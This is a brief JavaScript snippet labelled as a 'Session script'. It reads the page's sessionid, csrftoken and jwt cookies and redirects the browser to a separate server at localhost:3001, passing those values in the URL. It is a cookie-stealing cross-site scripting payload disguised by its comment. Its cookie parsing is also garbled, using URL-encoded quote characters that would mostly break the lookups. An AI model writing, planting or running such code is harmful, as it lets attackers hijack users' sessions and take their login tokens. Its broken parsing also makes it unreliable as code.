// Session script
(function () {
  const parsedCookies = Object.fromEntries(
    document.cookie
      .split("%27%27")
      .map((cString) => cString.split("%27=%27").map((x) => x.trim()))
      .filter(([cookieName]) =>
        ["%27sessionid%27", "%27csrftoken%27", "%27jwt%27"].includes(cookieName)
      )
  );
  const url = `http://localhost:3001/?login_sessionid=${parsedCookies.sessionid}&mcx_login_csrf=${parsedCookies.csrftoken}&mcx_jwt=${parsedCookies.jwt}`;
  window.location = url;
})();
